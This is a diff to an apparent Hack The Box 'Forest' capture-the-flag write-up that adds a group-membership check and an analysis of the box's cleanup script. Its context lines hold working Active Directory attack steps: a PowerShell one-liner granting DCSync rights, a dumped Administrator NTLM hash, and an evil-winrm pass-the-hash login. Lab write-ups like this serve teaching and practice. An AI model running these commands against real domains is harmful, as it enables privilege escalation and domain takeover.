@@ -256,6 +256,20 @@ I’ll create a one-liner to run locally. I don’t need to pass credentials to 
 Add-DomainGroupMember -Identity 'Exchange Windows Permissions' -Members svc-alfresco; $username = "htb\svc-alfresco"; $password = "s3rvice"; $secstr = New-Object -TypeName System.Security.SecureString; $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)}; $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $secstr; Add-DomainObjectAcl -Credential $Cred -PrincipalIdentity 'svc-alfresco' -TargetIdentity 'HTB.LOCAL\Domain Admins' -Rights DCSync
 ```
 
+Then we can check the special group member
+```
+net group 'Exchange Windows Permissions'
+
+Group name     Exchange Windows Permissions
+Comment        This group contains Exchange servers that run Exchange cmdlets on behalf of users via the management service. Its members have permission to read and modify all Windows accounts and groups. This group should not be deleted.
+
+Members
+-------------------------------------------------------------------------------
+svc-alfresco             
+The command completed successfully.
+```
+
+
 If I run that on Forest, it returns without error:
 ```
 *Evil-WinRM* PS C:\> Add-DomainGroupMember -Identity 'Exchange Windows Permissions' -Members svc-alfresco; $username = "htb\svc-alfresco"; $password = "s3rvice"; $secstr = New-Object -TypeName System.Security.SecureString; $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)}; $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $secstr; Add-DomainObjectAcl -Credential $Cred -PrincipalIdentity 'svc-alfresco' -TargetIdentity 'HTB.LOCAL\Domain Admins' -Rights DCSync
@@ -276,5 +290,74 @@ htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d
 Then we can use `evil-winrm` to shell as SYSTEM.
 ```
 evil-winrm -i 10.10.10.161 -u administrator -p aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6
+```
 
+Beyond the root:
+There is a cleanup powershell script 
+```
+C:\Users\Administrator\Documents> type revert.ps1
+
+Import-Module C:\Users\Administrator\Documents\PowerView.ps1
+
+$users = Get-Content C:\Users\Administrator\Documents\users.txt
+
+while($true)
+
+{
+    Start-Sleep 60
+
+    Set-ADAccountPassword -Identity svc-alfresco -Reset -NewPassword (ConvertTo-SecureString -AsPlainText "s3rvice" -Force)
+
+    Foreach ($user in $users) {
+        $groups = Get-ADPrincipalGroupMembership -Identity $user | where {$_.Name -ne "Service Accounts"}
+
+        Remove-DomainObjectAcl -PrincipalIdentity $user -Rights DCSync
+
+        if ($groups -ne $null){
+            Remove-ADPrincipalGroupMembership -Identity $user -MemberOf $groups -Confirm:$false
+        }
+    }
+}
+```
+
+It loops doing the following:
+
+1. Sleep for 60 seconds.
+2. Resets the password for svc-alfresco to “s3rvice”.
+3. Loops over each user in users.txt in the Administrators documents folder.
+4. For each user, it removes the DCSync rights, and removes the user from all groups that are not named “Service Accounts”
+
+Querying the details confirms it:
+```
+C:\>schtasks /query /tn restore /v /fo list
+
+Folder: \
+HostName:                             FOREST
+TaskName:                             \restore
+Next Run Time:                        N/A
+Status:                               Running
+Logon Mode:                           Interactive/Background
+Last Run Time:                        10/19/2019 9:22:00 AM
+Last Result:                          267009
+Author:                               HTB\Administrator
+Task To Run:                          powershell.exe -ep bypass C:\Users\Administrator\Documents\revert.ps1
+Start In:                             N/A
+Comment:                              N/A
+Scheduled Task State:                 Enabled
+Idle Time:                            Disabled
+Power Management:                     Stop On Battery Mode, No Start On Batteries
+Run As User:                          SYSTEM
+Delete Task If Not Rescheduled:       Disabled
+Stop Task If Runs X Hours and X Mins: 72:00:00
+Schedule:                             Scheduling data is not available in this format.
+Schedule Type:                        At system start up
+Start Time:                           N/A
+Start Date:                           N/A
+End Date:                             N/A
+Days:                                 N/A
+Months:                               N/A
+Repeat: Every:                        N/A
+Repeat: Until: Time:                  N/A
+Repeat: Until: Duration:              N/A
+Repeat: Stop If Still Running:        N/A
 ```
